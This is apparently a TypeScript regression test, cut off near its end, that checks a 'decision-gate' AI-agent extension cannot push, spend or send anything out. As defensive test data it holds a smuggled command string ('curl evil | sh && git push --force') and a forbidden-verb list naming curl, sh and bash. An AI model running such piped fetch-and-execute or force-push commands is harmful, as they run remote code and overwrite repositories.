/**
 * decision-gate 회귀 — #24 의 G2 가 "테스트 하나"라고 적어 둔 그 테스트.
 *
 *   bun run pi-extensions/tests/decision-gate.test.ts
 *   ./run.sh test:decision-gate
 *
 * #24 §G2 done_when: *"그 경로가 push·유료 API 지출·외부 발신을 부를 권한을 갖지
 * 않음을 검증하는 테스트 하나가 통과한다."* 그래서 여기서 재는 것은 동작이 아니라
 * **사이드 세션에 넘어가는 옵션 객체와 argv 접두**다. 세션을 띄우지 않으므로
 * 모델도 쿼터도 쓰지 않는다.
 *
 * 확장은 `@earendil-works/*` 를 static import 하는데 그건 pi 번들 안에서만 풀린다.
 * `raw-paste.test.ts` 가 쓴 방법을 그대로 쓴다 — 파일을 읽어 그 import 줄만
 * 스텁으로 바꿔치기한 임시 복사본을 불러온다. 로직은 원본 그대로다.
 */

import { existsSync, mkdtempSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

const EXT = new URL("../decision-gate.ts", import.meta.url).pathname;
const dir = mkdtempSync(join(tmpdir(), "decision-gate-"));

const STUB = `
const parseJsonWithRepair = (s) => JSON.parse(s);
const StringEnum = (values, options) => ({ type: "string", enum: [...values], ...options });
// 사이드 세션 생성만 테스트가 갈아끼운다. 안 끼우면 예전처럼 던진다 — 실물 세션을
// 실수로 띄우는 경로가 이 파일에 생기지 않게.
const createAgentSession = async (options) => {
	const stub = globalThis.__decisionGateStubs?.createAgentSession;
	if (!stub) throw new Error("not used in this test");
	return stub(options);
};
const createExtensionRuntime = () => ({});
const SessionManager = { inMemory: () => ({ __inMemory: true }) };
const Type = {
	Object: (props) => ({ type: "object", properties: props }),
	String: (o) => ({ type: "string", ...o }),
	Number: (o) => ({ type: "number", ...o }),
	Optional: (s) => ({ ...s, __optional: true }),
};
`;

const patched = join(dir, "patched.ts");
writeFileSync(
	patched,
	STUB +
		readFileSync(EXT, "utf8")
			// 값 import 두 줄과 typebox 한 줄만 스텁으로 대체. 타입 import 는 런타임에 지워진다.
			.replace(/^import \{[^}]*\} from "@earendil-works\/pi-ai";$/m, "")
			.replace(/^import \{[^}]*\} from "@earendil-works\/pi-coding-agent";$/m, "")
			.replace(/^import \{ Type \} from "typebox";$/m, ""),
);

const mod = await import(patched);
const {
	buildDigArgv,
	buildConsultSessionOptions,
	buildConsultDetails,
	candidatesFromEnv,
	createDigTool,
	explainFailure,
	parseModelSpec,
	parseVerdict,
	resolveCandidates,
	resolveCitedIds,
	findPendingBlocked,
	selectFastModel,
	CONSULT_ENTRY_TYPE,
} = mod;

let failures = 0;
function check(name: string, ok: boolean, detail = ""): void {
	if (ok) {
		console.log(`  ok   ${name}`);
	} else {
		failures++;
		console.log(`  FAIL ${name}${detail ? ` — ${detail}` : ""}`);
	}
}

// ── G2: 사이드 세션에 push·유료·외부 발신 권한이 없다 ────────────────────────
console.log("G2 — the consult path has no push / paid-spend / outbound authority");

const opts = buildConsultSessionOptions({ provider: "openai-codex", id: "gpt-5.6-terra" }, { name: "dig" });

// `noTools:"all"` would also kill the custom tool — measured 2026-09-09, the sibling
// then invented a call shape in prose. So the contract is "builtin" + a one-name allowlist.
check("built-ins are suppressed by default", opts.noTools === "builtin", `got ${String(opts.noTools)}`);
check("the allowlist names exactly one tool", Array.isArray(opts.tools) && opts.tools.length === 1 && opts.tools[0] === "dig");
check("dig survives the suppression — the allowlist keeps it", opts.noTools !== "all" && opts.tools.includes("dig"));
check("no built-in is on the allowlist", !["read", "bash", "edit", "write", "grep", "find", "ls"].some((t) => opts.tools.includes(t)));
check("the only custom tool is dig", opts.customTools.length === 1 && opts.customTools[0].name === "dig");
check("session is in-memory — no second session file on disk", (opts.sessionManager as { __inMemory?: boolean }).__inMemory === true);
check("skills are emptied — a skill doc cannot smuggle a command in", opts.resourceLoader.getSkills().skills.length === 0);
check("extensions are emptied — no recursion into this extension", opts.resourceLoader.getExtensions().extensions.length === 0);
check("AGENTS.md is not loaded into the side turn", opts.resourceLoader.getAgentsFiles().agentsFiles.length === 0);

// ── G2: argv 접두가 고정이고 셸이 없다 ──────────────────────────────────────
console.log("G2 — dig argv is built here, not by the model");

const SM = "semantic-memory";
for (const [axis, sub] of [
	["sessions", "search-sessions"],
	["garden", "search-md"],
	["openclaw", "search-openclaw"],
] as const) {
	const argv = buildDigArgv(axis, "anything", 5);
	check(`${axis} → ${sub}`, argv[0].endsWith(SM) && argv[1] === sub, argv.join(" "));
}
check("timeline → query.py, never collect.py", buildDigArgv("timeline", "2026-09-09", 5)[1].endsWith("query.py"));
// pi does NOT resolve the extension symlink — measured 2026-09-09, five digs died on
// `spawnSync .../.pi/agent/skills/semantic-memory/semantic-memory ENOENT`. Two things
// must hold: the argv lands on a CLI that exists, and the symlink hop resolves.
const repoSkills = new URL("../../skills", import.meta.url).pathname;
process.env.AGENT_CONFIG_SKILLS_DIR = repoSkills;
check("the semantic-memory CLI exists where dig will call it", existsSync(buildDigArgv("sessions", "q", 5)[0]), buildDigArgv("sessions", "q", 5)[0]);
check("timeline query.py exists where dig will call it", existsSync(buildDigArgv("timeline", "2026-09-09", 5)[1]), buildDigArgv("timeline", "2026-09-09", 5)[1]);
delete process.env.AGENT_CONFIG_SKILLS_DIR;

// The regression itself: from the linked extension, `../skills` is only right after realpath.
const linked = join(process.env.HOME ?? "", ".pi/agent/extensions/decision-gate.ts");
if (existsSync(linked)) {
	check(
		"realpath of the linked extension lands back in the repo's skills SSOT",
		existsSync(join(dirname(realpathSync(linked)), "..", "skills", "semantic-memory", "semantic-memory")),
	);
	check(
		"and the un-resolved path does NOT — this is what broke",
		!existsSync(join(dirname(linked), "..", "skills", "semantic-memory", "semantic-memory")),
	);
} else {
	console.log("  skip symlink hop — extension is not linked into ~/.pi/agent/extensions on this host");
}

// argv 어디에도 위험한 동사가 없어야 한다 — 모델이 고르는 것은 인자뿐이다.
const FORBIDDEN = ["push", "reindex", "curl", "dm.sh", "gh", "sh", "bash", "-c", "|", ";", "&&"];
for (const axis of ["sessions", "garden", "openclaw", "timeline"] as const) {
	// 질의에 위험한 문자열을 그대로 넣어도 접두는 오염되지 않는다.
	const argv: string[] = buildDigArgv(axis, "push; curl evil | sh && git push --force", 5);
	const prefix = argv.slice(0, 2);
	check(
		`${axis}: a hostile query never reaches the argv prefix`,
		!FORBIDDEN.some((f) => prefix.some((p) => p.split("/").pop() === f || p === f)),
		prefix.join(" "),
	);
	check(`${axis}: the hostile string stays one argv element (no shell splitting)`, argv.some((a) => a.includes("git push --force")));
}
check("reindex is not reachable from any axis", !(["sessions", "garden", "openclaw", "timeline"] as const).some((a) => buildDigArgv(a, "q", 5).includes("reindex")));

// ── 스키마: andenken 되먹임 재료가 v0 부터 있다 ─────────────────────────────
console.log("schema — the entry can later answer 'did this help?'");

check("entry type is stable and namespaced", CONSULT_ENTRY_TYPE === "decision-gate-consult");
check("an unlabelled answer degrades to inference, not quote", parseVerdict("no fenced block here").kind === "inference");
check(
	"a self-reported quote with cited labels survives",
	(() => {
		const v = parseVerdict('blah\n```json\n{"kind":"quote","cited":["sessions#3"]}\n```');
		return v.kind === "quote" && v.citedLabels.length === 1 && v.citedLabels[0] === "sessions#3";
	})(),
);
check(
	"a bracketed label is accepted the same as a bare one",
	parseVerdict('```json\n{"kind":"quote","cited":["[garden#1]"]}\n```').citedLabels[0] === "garden#1",
);
// The live run on 2026-09-09 cited two session UUIDs that resolved against nothing,
// because 100-char paths are not something a model will retype. Labels fixed that;
// the resolver is what keeps an unresolvable citation from silently becoming a fact.
const digsFixture = [
	{ axis: "sessions", query: "q", argv: [], hits: [{ label: "sessions#1", id: "/x/a.jsonl:12" }, { label: "sessions#2", id: "/x/b.jsonl:7" }] },
	{ axis: "garden", query: "q", argv: [], hits: [{ label: "garden#1", id: "/notes/c.md" }] },
];
check("a label resolves to its full hit id", resolveCitedIds(digsFixture, ["sessions#2"])[0] === "/x/b.jsonl:7");
check("labels resolve across axes", resolveCitedIds(digsFixture, ["sessions#1", "garden#1"]).length === 2);
check(
	"an unresolvable citation is dropped from ids, not invented",
	resolveCitedIds(digsFixture, ["d682d5c4-8579-4433-a598-2d73d8806a7e", "garden#1"]).length === 1,
);
check("no hits means no cited ids", resolveCitedIds([], ["sessions#1"]).length === 0);
check(
	"malformed json degrades to inference instead of throwing",
	parseVerdict("```json\n{kind: broken,,}\n```").kind === "inference",
);
check("an unlabelled answer cites nothing", parseVerdict("no fenced block").citedLabels.length === 0);
check(
	"the last fenced block wins when the model emits several",
	parseVerdict('```json\n{"kind":"quote"}\n```\ntext\n```json\n{"kind":"inference"}\n```').kind === "inference",
);

// ── 트리거: blocked 한 전이에 한 번, goal.ts 는 안 고친다 ────────────────────
console.log("trigger — one consult per blocked transition, read out of goal.ts's own entries");

const goalEntry = (status: string, updatedAt: number) => ({
	type: "custom",
	customType: "goal",
	data: { goal: { id: "g1", status, objective: "ship it", updatedAt } },
});
const consultEntry = (updatedAt: number) => ({
	type: "custom",
	customType: CONSULT_ENTRY_TYPE,
	data: { trigger: { goalId: "g1", goalUpdatedAt: updatedAt } },
});

check("active goal does not fire", findPendingBlocked([goalEntry("active", 1)]) === null);
check("blocked goal fires", findPendingBlocked([goalEntry("blocked", 1)])?.id === "g1");
check("same transition does not fire twice", findPendingBlocked([goalEntry("blocked", 1), consultEntry(1)]) === null);
check("a later blocked transition fires again", findPendingBlocked([goalEntry("blocked", 1), consultEntry(1), goalEntry("blocked", 2)])?.updatedAt === 2);
check(
	"resuming to active clears it — the last goal entry wins",
	findPendingBlocked([goalEntry("blocked", 1), goalEntry("active", 2)]) === null,
);
check(
	"session cap of 3 holds",
	findPendingBlocked([consultEntry(9), consultEntry(8), consultEntry(7), goalEntry("blocked", 5)]) === null,
);
check("unrelated custom entries are ignored", findPendingBlocked([{ type: "custom", customType: "btw-thread-entry", data: {} }]) === null);
check("non-custom entries are ignored", findPendingBlocked([{ type: "message", role: "user" }]) === null);

// ── 예산: 한 판이 무한히 캘 수 없다 ─────────────────────────────────────────
// 실측 2026-09-09 의 한 판이 dig 21회를 불렀고, 그때 각 dig 은 120초 타임아웃의
// `spawnSync` 였다 — 상주의 시간을 아끼려고 만든 물건이 상주의 프로세스를 통째로
// 세울 수 있었다. 여기서 재는 것은 **상한이 프로세스를 아예 안 띄운다**는 것이다.
console.log("budget — one consult cannot dig forever");

type FakeRun = { argv: string[]; timeoutMs: number };
function fakeRunner(seen: FakeRun[]) {
	return async (argv: string[], o: { timeoutMs: number }) => {
		seen.push({ argv, timeoutMs: o.timeoutMs });
		return { stdout: '{"results":[]}', stderr: "", status: 0 };
	};
}

const seenRuns: FakeRun[] = [];
const budgetDigs: unknown[] = [];
const { tool: budgetTool, budget } = createDigTool(budgetDigs, { maxDigs: 2, runner: fakeRunner(seenRuns) });
const digResults = [];
for (let i = 0; i < 4; i++) {
	digResults.push(await budgetTool.execute(`c${i}`, { axis: "sessions", query: `q${i}` }, undefined, undefined, {}));
}
check("the cap is a spawn cap — only maxDigs processes are started", seenRuns.length === 2, `spawned ${seenRuns.length}`);
check("the budget counts what it refused", budget.spawned === 2 && budget.refused === 2, JSON.stringify(budget));
check("a refused dig returns isError, so the sibling is told to answer now", digResults[2].isError === true && digResults[3].isError === true);
check(
	"the refusal is recorded once, not once per attempt — the entry does not bloat",
	budgetDigs.filter((d: { error?: string }) => (d.error ?? "").includes("budget exhausted")).length === 1,
	`${budgetDigs.length} record(s)`,
);
check("a refused dig carries no argv — nothing was built to run", (budgetDigs[2] as { argv: string[] }).argv.length === 0);
check("the runner gets the argv this file builds, not the model's", seenRuns[0].argv[1] === "search-sessions");
// 120s was the old per-dig ceiling; eight of those is 16 minutes inside one hook.
check("a dig cannot hang for the old 120s", seenRuns[0].timeoutMs <= 60_000, `${seenRuns[0].timeoutMs}ms`);

const explicitRuns: FakeRun[] = [];
const { tool: fastTool } = createDigTool([], { maxDigs: 1, timeoutMs: 1234, runner: fakeRunner(explicitRuns) });
await fastTool.execute("c", { axis: "garden", query: "q" }, undefined, undefined, {});
check("the per-dig timeout is injectable", explicitRuns[0].timeoutMs === 1234);

// ── 실패 사유: 영수증이 배너가 아니라 이유를 실어야 한다 ────────────────────
// 실물 2026-09-09: oracle 의 `search-openclaw` 는 exit 4 + stdout 에 구조화된 이유,
// stderr 에는 npm 경고와 provider 배너뿐이었다. 앞 500자를 실으면 배너만 남는다.
console.log("dig failure — the receipt carries the reason, not the banner");

const ABSENT = JSON.stringify({
	axis: "openclaw",
	state: "absent",
	host: "oracle",
	authority: "thinkpad",
	reason: "the openclaw index is deliberately not replicated; this host is a consumer with no copy of the axis",
	next: "ask the authority host (thinkpad), or search another axis and say which axis you searched",
});
const BANNER = "npm warn Unknown project config\n🟡 vllm (sessions:openrouter): paid remote endpoint";

const absentWhy = explainFailure(ABSENT, BANNER, 4);
check("a structured stdout explanation wins over stderr", absentWhy.includes("state=absent") && absentWhy.includes("authority=thinkpad"));
check("the banner does not reach the receipt", !absentWhy.includes("openrouter"));
check("the next step travels too — the sibling can say where to ask", absentWhy.includes("ask the authority host"));
check("npm and provider noise alone degrade to the exit code", explainFailure("", BANNER, 4) === "exited with status 4");
check("a real stderr message survives", explainFailure("", `${BANNER}\nError: connection refused`, 1).includes("connection refused"));
check("a long stderr keeps its tail, where the real error lives", explainFailure("", `${"x".repeat(900)}\nENOENT: no such file`, 1).endsWith("ENOENT: no such file"));

// ── 모델 지정면: 게이트가 어느 모델로 캘지 GLG 가 정한다 ────────────────────
// GLG 2026-09-09: "오프스가 돌다가 게이트는 terra 또는 luna로 잡아 놓고 답변 받게
// 한다든가. … 개념상으로 모델을 다르게 가져가는거야."
console.log("model surface — the operator picks the consult rail");

check("provider/id is read as one candidate", (() => {
	const [c] = parseModelSpec("openai-codex/gpt-5.6-terra");
	return c.provider === "openai-codex" && c.model === "gpt-5.6-terra";
})());
check("a comma list keeps its order", parseModelSpec("a/x, b/y").map((c: { provider: string }) => c.provider).join(",") === "a,b");
check("a bare name means any rail", (() => {
	const [c] = parseModelSpec("luna");
	return c.provider === undefined && c.model === "luna";
})());
check("whitespace and empty entries are dropped", parseModelSpec("  ,  terra ,, ").length === 1);
check("an empty spec parses to nothing, not to a wildcard", parseModelSpec("   ").length === 0);

check("DECISION_GATE_MODELS is read", candidatesFromEnv({ DECISION_GATE_MODELS: "zai/glm-5.3" })?.[0].provider === "zai");
check("the singular DECISION_GATE_MODEL also works", candidatesFromEnv({ DECISION_GATE_MODEL: "luna" })?.[0].model === "luna");
check("the plural wins over the singular", candidatesFromEnv({ DECISION_GATE_MODELS: "a/x", DECISION_GATE_MODEL: "b/y" })?.[0].provider === "a");
check("an empty env value is not a setting", candidatesFromEnv({ DECISION_GATE_MODELS: "   " }) === null);
check("no env key at all means no override", candidatesFromEnv({}) === null);

const M = (provider: string, id: string) => ({ provider, id });
const CATALOGUE = [
	M("openai-codex", "gpt-5.6-terra"),
	M("openai-codex", "gpt-5.6-luna"),
	M("openai-codex", "gpt-5.6-terra-preview"),
	M("github-copilot", "gpt-5.6-terra"),
	M("github-copilot", "gpt-5.6-luna"),
	M("zai", "glm-5.3"),
	M("xai", "grok-4.6"),
	M("anthropic", "claude-opus-5"),
];
const id = (m: { provider: string; id: string } | undefined) => (m ? `${m.provider}/${m.id}` : "(none)");

check(
	"an exact provider/id resolves to exactly that",
	id(resolveCandidates(CATALOGUE, parseModelSpec("github-copilot/gpt-5.6-luna"))[0]) === "github-copilot/gpt-5.6-luna",
);
check(
	"a bare name resolves across rails in MODELS.md order",
	resolveCandidates(CATALOGUE, parseModelSpec("gpt-5.6-luna")).map(id).join(" ") === "openai-codex/gpt-5.6-luna github-copilot/gpt-5.6-luna",
);
// 부분일치는 편의이지 우선권이 아니다 — 정확히 적은 이름을 앞지르면 안 된다.
check(
	"an exact name beats a longer partial match on the same rail",
	id(resolveCandidates(CATALOGUE, parseModelSpec("gpt-5.6-terra"))[0]) === "openai-codex/gpt-5.6-terra",
);
check(
	"a partial match is not offered at all once an exact name matched — convenience must not widen a spec",
	!resolveCandidates(CATALOGUE, parseModelSpec("gpt-5.6-terra")).map(id).includes("openai-codex/gpt-5.6-terra-preview"),
);
check(
	"but a name that matches nothing exactly still resolves by substring",
	resolveCandidates(CATALOGUE, parseModelSpec("terra-pre")).map(id).join(" ") === "openai-codex/gpt-5.6-terra-preview",
);
check("a name nothing matches resolves to nothing — not to a default", resolveCandidates(CATALOGUE, parseModelSpec("gpt-9")).length === 0);
check("a candidate list is de-duplicated across entries", resolveCandidates(CATALOGUE, parseModelSpec("gpt-5.6-luna, openai-codex/gpt-5.6-luna")).filter((m) => id(m) === "openai-codex/gpt-5.6-luna").length === 1);

// ── 레일: consult 는 상주의 모델이면 안 된다 ────────────────────────────────
// GLG 의 자리 그대로다 — "답변도 느리고 쿼터를 많이 차지하는 모델이 고민하는 중에
// … 빠른 형제에게 얼른 물어보는거야." 같은 provider+id 는 형제가 아니라 자기다.
console.log("rail — the consult never lands on the resident's own model");

const registryOf = (models: Array<{ provider: string; id: string }>, authed: (m: { provider: string }) => boolean = () => true) => ({
	getAvailable: () => models,
	hasConfiguredAuth: (m: { provider: string }) => authed(m),
	getApiKeyAndHeaders: async (m: { provider: string }) => ({ ok: authed(m) }),
});
const anyRegistry = registryOf(CATALOGUE);

check("with no resident named, the built-in candidate order decides", id(await selectFastModel(anyRegistry)) === "openai-codex/gpt-5.6-terra");
check(
	"the resident's exact rail is skipped",
	id(await selectFastModel(anyRegistry, { provider: "openai-codex", id: "gpt-5.6-terra" })) !== "openai-codex/gpt-5.6-terra",
);
check(
	"the skip moves to the next candidate, it does not give up",
	id(await selectFastModel(anyRegistry, { provider: "openai-codex", id: "gpt-5.6-terra" })) === "github-copilot/gpt-5.6-terra",
);
check(
	"the same model name on another provider is a different rail, so it is not skipped",
	id(await selectFastModel(anyRegistry, { provider: "github-copilot", id: "gpt-5.6-terra" })) === "openai-codex/gpt-5.6-terra",
);
check("a resident outside the candidate list changes nothing", id(await selectFastModel(anyRegistry, { provider: "anthropic", id: "claude-opus-5" })) === "openai-codex/gpt-5.6-terra");
// 이게 GLG 가 요청한 판이다: 오푸스가 상주, 게이트는 luna.
check(
	"an operator-named model is what runs the consult",
	id(await selectFastModel(anyRegistry, { provider: "anthropic", id: "claude-opus-5" }, parseModelSpec("luna"))) === "openai-codex/gpt-5.6-luna",
);
check(
	"a named model that is also the resident still fails closed",
	(await selectFastModel(anyRegistry, { provider: "openai-codex", id: "gpt-5.6-luna" }, parseModelSpec("openai-codex/gpt-5.6-luna"))) === null,
);
check(
	"an unauthed named model is skipped, not forced",
	id(await selectFastModel(registryOf(CATALOGUE, (m) => m.provider !== "openai-codex"), null, parseModelSpec("gpt-5.6-luna"))) === "github-copilot/gpt-5.6-luna",
);
check(
	"when the only authed rail is the resident's, it fails closed instead of doubling up",
	(await selectFastModel(registryOf(CATALOGUE, (m) => m.provider === "openai-codex"), { provider: "openai-codex", id: "gpt-5.6-terra" }, parseModelSpec("openai-codex/gpt-5.6-terra"))) === null,
);

// ── 타이밍: agent_end 가 아니라 agent_settled ──────────────────────────────
// `agent_end` 핸들러는 루프 안에서 await 되고(agent-session.ts:773-774), 그 뒤에야
// pi 가 재시도·압축·큐된 continuation 을 정한다(:1104-1146). 몇 분짜리 consult 를
// 거기 달면 재시도 앞을 막는다. `agent_settled` 는 "더 이상 아무것도 안 돈다" 뒤에
// 정확히 한 번 온다(extensions/types.ts:742).
console.log("timing — the consult runs at agent_settled, and never queues a turn");

const handlers = new Map<string, (e: unknown, c: unknown) => Promise<unknown>>();
const piCalls: string[] = [];
const entries: Array<{ type: string; data: Record<string, unknown> }> = [];
const commands = new Map<string, { handler: (args: string, ctx: unknown) => Promise<void> }>();
const shown: Array<{ customType: string; content: string; triggerTurn: boolean }> = [];
const fakePi = new Proxy(
	{
		on: (event: string, handler: (e: unknown, c: unknown) => Promise<unknown>) => handlers.set(event, handler),
		appendEntry: (type: string, data: Record<string, unknown>) => entries.push({ type, data }),
		registerCommand: (name: string, opts: { handler: (args: string, ctx: unknown) => Promise<void> }) => commands.set(name, opts),
		sendMessage: (msg: { customType: string; content: string }, opts?: { triggerTurn?: boolean }) =>
			shown.push({ customType: msg.customType, content: msg.content, triggerTurn: opts?.triggerTurn !== false }),
	} as Record<string, unknown>,
	{
		get(target, prop: string) {
			piCalls.push(prop);
			// 없는 API 를 부르면 그 이름이 piCalls 에 남고 호출은 터진다 — 조용히 통과하지 않는다.
			return target[prop];
		},
	},
);
mod.default(fakePi);
check("both events are wired", handlers.has("agent_end") && handlers.has("agent_settled"));
check("the operator command is registered", commands.has("decision-gate"));

const blockedBranch = [{ type: "custom", customType: "goal", data: { goal: { id: "g9", status: "blocked", objective: "ship it", updatedAt: 42 } } }];
let sessionsCreated = 0;
let promptedWith = "";
const sideMessages = [
	{
		role: "assistant",
		content: [{ type: "text", text: 'GLG said X.\n```json\n{"kind":"quote","cited":["sessions#1"]}\n```' }],
		usage: { input: 10, output: 5 },
	},
];
(globalThis as Record<string, unknown>).__decisionGateStubs = {
	createAgentSession: async (options: { customTools: Array<{ execute: Function }> }) => {
		sessionsCreated++;
		return {
			session: {
				state: { messages: sideMessages },
				prompt: async (text: string) => {
					promptedWith = text;
					// 형제가 한 번 캔다 — 엔트리에 dig 영수증이 실리는지 보려고.
					await options.customTools[0].execute("t1", { axis: "sessions", query: "what did GLG say" }, undefined, undefined, {});
				},
				abort: async () => {},
				dispose: () => {},
			},
		};
	},
};

const fakeCtx = {
	hasUI: false,
	model: { provider: "anthropic", id: "claude-opus-5" },
	modelRegistry: anyRegistry,
	sessionManager: { getBranch: () => blockedBranch, getSessionId: () => "sess-1" },
	ui: { notify: () => {} },
};

// agent_end 하나만으로는 아무 일도 일어나지 않는다 — 그 핸들러는 결정하지 않는다.
await handlers.get("agent_end")!({ messages: [{ role: "assistant", content: [{ type: "text", text: "I am blocked on the rail choice." }] }] }, fakeCtx);
check("agent_end alone creates no side session", sessionsCreated === 0);
check("agent_end alone writes no entry", entries.length === 0);

// 실물 dig 이 안 돌게 스킬 경로를 없는 곳으로 돌려 둔다(엔트리에는 error 로 남는다).
process.env.AGENT_CONFIG_SKILLS_DIR = join(dir, "no-skills-here");
await handlers.get("agent_settled")!({}, fakeCtx);
delete process.env.AGENT_CONFIG_SKILLS_DIR;

check("agent_settled is what runs the consult", sessionsCreated === 1);
check("exactly one entry is written", entries.length === 1, `${entries.length}`);
check("and it is the consult entry", entries[0]?.type === CONSULT_ENTRY_TYPE);
check(
	"the resident's last words reached the sibling — that is all agent_end was for",
	promptedWith.includes("I am blocked on the rail choice."),
);
// 본대화 유입 금지: 이 확장이 pi 에서 만지는 것은 on/appendEntry 둘뿐이다.
check(
	"no conversation inflow — sendMessage / sendUserMessage are never touched",
	!piCalls.includes("sendMessage") && !piCalls.includes("sendUserMessage"),
	piCalls.join(","),
);
check(
	"the consult path touches only on / registerCommand / appendEntry",
	[...new Set(piCalls)].every((c) => c === "on" || c === "appendEntry" || c === "registerCommand"),
	[...new Set(piCalls)].join(","),
);
check("the consult itself sends no message at all", shown.length === 0);

const entry = entries[0]?.data as {
	resident: { provider: string } | null;
	model: { provider: string };
	modelSource: string;
	budget: { maxDigs: number; digsSpawned: number; digsRefused: number; deadlineHit: boolean };
	digs: unknown[];
	answer: { kind: string; citedLabels: string[]; citedHitIds: string[] };
	helpful: null;
	trigger: { goalId: string; goalStatus: string; goalUpdatedAt: number; sessionId: string };
};
check("a good consult is recorded as ok", (entry as unknown as { outcome: string }).outcome === "ok");
check("the entry names the resident rail it spared", entry.resident?.provider === "anthropic");
check("and the fast rail it used instead", entry.model.provider === "openai-codex");
check("and where that choice came from", entry.modelSource === "default", entry.modelSource);
check("the trigger is the blocked transition it read out of goal.ts", entry.trigger.goalId === "g9" && entry.trigger.goalStatus === "blocked" && entry.trigger.goalUpdatedAt === 42);
check("the budget rides along, so a truncated consult reads differently later", entry.budget.maxDigs > 0 && entry.budget.digsSpawned === 1 && entry.budget.deadlineHit === false);
check("the dig receipt is in the entry", entry.digs.length === 1);
check("helpful stays null — this extension never grades itself", entry.helpful === null);

// 두 번째 settled 는 같은 전이라 다시 캐지 않는다. 실물에서는 엔트리가 브랜치에
// 들어오므로 findPendingBlocked 가 막지만, 여기서는 브랜치가 고정이라 그 계약을
// findPendingBlocked 쪽에서 이미 잰다(위 "same transition does not fire twice").

// ── 지정면 end-to-end: /decision-gate model 이 실제로 그 모델로 캐게 한다 ──
console.log("operator command — /decision-gate model picks the rail the consult runs on");

const cmd = commands.get("decision-gate")!.handler;
const cmdCtx = { ...fakeCtx, modelRegistry: registryOf(CATALOGUE) };

await cmd("status", cmdCtx);
check("status prints a panel", shown.length === 1 && shown[0].content.includes("decision-gate — consult model"));
check("the panel is display-only — it never triggers a turn", shown[0].triggerTurn === false);
check("the panel names the resident it will skip", shown[0].content.includes("anthropic/claude-opus-5"));
check("the panel says where the candidates came from", shown[0].content.includes("(default)"));

await cmd("model luna", cmdCtx);
check("naming a model reports back", shown[1].content.includes("(session)") && shown[1].content.includes("*/luna"));

// 그 지정이 실제 consult 에 걸리는가 — 두 번째 blocked 전이를 태워 본다.
blockedBranch.push({ type: "custom", customType: "goal", data: { goal: { id: "g10", status: "blocked", objective: "pick a rail", updatedAt: 43 } } });
sessionsCreated = 0;
process.env.AGENT_CONFIG_SKILLS_DIR = join(dir, "no-skills-here");
await handlers.get("agent_settled")!({}, cmdCtx);
delete process.env.AGENT_CONFIG_SKILLS_DIR;
check("the named model is the one that ran", sessionsCreated === 1 && entries.length === 2);
const second = entries[1].data as { model: { provider: string; id: string }; modelSource: string; resident: { id: string } };
check("opus stayed resident while luna dug — GLG's own example", second.model.id === "gpt-5.6-luna" && second.resident.id === "claude-opus-5");
check("and the entry records that a human picked it", second.modelSource === "session", second.modelSource);

await cmd("model reset", cmdCtx);
check("reset goes back to the built-in order", shown[shown.length - 1].content.includes("(default)"));
await cmd("model gpt-9-nope", cmdCtx);
check("a model this registry does not have is refused, not silently accepted", shown[shown.length - 1].content.includes("No model in this registry matches"));
await cmd("nonsense", cmdCtx);
check("an unknown argument answers with usage instead of crashing", shown[shown.length - 1].content.includes("Usage:"));

// 패널은 모델에게 안 간다 — heartbeat 와 같은 자리(heartbeat.ts:372).
const filtered = await handlers.get("context")!(
	{ messages: [{ customType: "decision-gate-ui", content: "panel" }, { role: "user", content: "real" }] },
	cmdCtx,
);
check("the context filter drops the panel and keeps the conversation", (filtered as { messages: unknown[] }).messages.length === 1);

// ── 실패도 영수증을 남긴다 — 교차검수(gpt-5.6-terra, 2026-09-09)가 잡은 구멍 ──
// 성공했을 때만 엔트리를 쓰면, deadline/오류로 끝난 전이에는 표식이 없어서 다음
// agent_settled 가 **같은 blocked 전이를 다시 유료로** 캔다. findPendingBlocked 가
// 이 엔트리 하나로 에지를 판정하기 때문이다. 세션당 상한 3회도 같은 이유로 안 센다.
console.log("failure receipts — a consult that broke still consumes its transition");

const failBranch: unknown[] = [
	{ type: "custom", customType: "goal", data: { goal: { id: "gf", status: "blocked", objective: "fail here", updatedAt: 77 } } },
];
const failEntries: Array<{ type: string; data: Record<string, unknown> }> = [];
const failHandlers = new Map<string, (e: unknown, c: unknown) => Promise<unknown>>();
const failPi = {
	on: (e: string, h: (ev: unknown, c: unknown) => Promise<unknown>) => failHandlers.set(e, h),
	appendEntry: (type: string, data: Record<string, unknown>) => failEntries.push({ type, data }),
	registerCommand: () => {},
	sendMessage: () => {},
};
mod.default(failPi);

const failCtx = {
	hasUI: false,
	model: { provider: "anthropic", id: "claude-opus-5" },
	modelRegistry: registryOf(CATALOGUE),
	// 브랜치는 살아 있는 배열이라, 엔트리가 실제로 전이를 소진하는지 아래에서 그대로 잰다.
	sessionManager: { getBranch: () => [...failBranch, ...failEntries.map((e) => ({ type: "custom", customType: e.type, data: e.data }))], getSessionId: () => "sess-fail" },
	ui: { notify: () => {} },
};

(globalThis as Record<string, unknown>).__decisionGateStubs = {
	createAgentSession: async () => {
		throw new Error("provider exploded mid-consult");
	},
};
await failHandlers.get("agent_settled")!({}, failCtx);
check("a consult that threw still writes an entry", failEntries.length === 1);
const failed = failEntries[0]?.data as { outcome: string; error: string; model: unknown; digs: unknown[] };
check("and the entry says it failed, with the reason", failed.outcome === "error" && failed.error.includes("provider exploded"));
check("the model it tried is still named", (failed.model as { id: string }).id === "gpt-5.6-terra");
// 이게 구멍의 본체였다: 표식이 없으면 같은 전이가 다음 settled 에서 다시 돈다.
await failHandlers.get("agent_settled")!({}, failCtx);
check("the failed transition is consumed — it does not fire again and pay again", failEntries.length === 1);

// 후보가 하나도 안 서는 경우도 침묵이 아니라 영수증이다.
const noModelCtx = {
	...failCtx,
	modelRegistry: registryOf([]),
	sessionManager: {
		getBranch: () => [{ type: "custom", customType: "goal", data: { goal: { id: "gn", status: "blocked", objective: "no rail", updatedAt: 88 } } }, ...failEntries.slice(1).map((e) => ({ type: "custom", customType: e.type, data: e.data }))],
		getSessionId: () => "sess-nomodel",
	},
};
await failHandlers.get("agent_settled")!({}, noModelCtx);
const nm = failEntries[1]?.data as { outcome: string; model: null; error: string };
check("no available fast model is recorded, not swallowed", failEntries.length === 2 && nm.outcome === "no-model");
check("the entry carries no model, and says how to set one", nm.model === null && nm.error.includes("/decision-gate model"));

// ── 엔트리 빌더: 세션 없이도 스키마를 잰다 ─────────────────────────────────
console.log("entry builder — schema without a session");
const built = buildConsultDetails({
	blocked: { id: "g1", objective: "obj", updatedAt: 7 },
	sessionId: "s",
	model: { provider: "zai", id: "glm-5.3" },
	outcome: "deadline" as const,
	error: "consult was cut at the 8min wall clock",
	resident: null,
	modelSource: "session" as const,
